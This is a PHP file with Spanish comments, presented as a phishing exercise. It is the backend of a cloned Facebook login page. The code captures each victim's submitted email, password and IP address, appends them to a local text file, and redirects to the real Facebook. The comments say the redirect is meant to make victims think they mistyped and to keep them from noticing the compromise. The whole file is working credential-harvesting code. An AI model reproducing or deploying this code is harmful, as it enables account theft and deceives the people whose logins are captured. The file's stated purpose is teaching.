<?php

    /**
     * Ejemplo de Physing
     * 
     * En este ejercicio tratamos de suplantar un sitio web con el fin de capturar el usuario y contraseña de una víctima.
     * Para ello, servimos una página clon de la página a suplantar, en este caso la página de Login de Facebook.
     * Cuando el usuario haga "login", capturamos los datos de inicio de sesión, los almacenamos y redireccionamos a la página original.
     * Si todo ha salido bien, el usuario víctima pensará que se equivocó al introducir el usuario o la contraseña.
     * 
     * @category Cybersecurity
     * @author David Nuño García <davidnunogarcia@gmail.com>
     * @version 1.0
     * @since 1.0
     * 
     * Gracias a Mike Woodward (@citizenwoodward) por la codificación de la página clon del login de facebook
     * @see https://codepen.io/citizenwoodward/pen/emBRXW
     */

    // Obtenemos la dirección IP de la víctima
    $ip = getenv("REMOTE_ADDR");

    // Creamos un mesnaje con el contenido de las variables que capturamso por el método post, además de la IP
    $message = "Email: ".$_POST["email"]."\n"."Pass: ".$_POST["password"]."\nIP: ".$ip."\n----------------------------------------------\n";

    // En este punto ya tenemos un mensaje almacenado en una variable con la dirección de email, la contraseña y la IP de la víctima.
    // Ahora, deberíamos almacenar esta información, bien en una cuenta de correo, en una base de datos, en un fichero de objetos, o en uno de texto.
    // Por cuestiones de simplicidad, almacenaremos los mensajes en un fichero de texto plano.
    $victims = 'results.txt';
    $handle = fopen($victims, 'a') or die('Cannot open file:  '.$victims);
    fwrite($handle, $message);
    fclose($handle);

    // Redireccionamos a la página original. Al realizar esta operación, hacemos creer al usuario 
    // que se equivocó al introducir el usuario o la contraseña. De esta forma no pensará que su cuenta ha sido comprometida.
    header("Location: http://www.facebook.com");

?>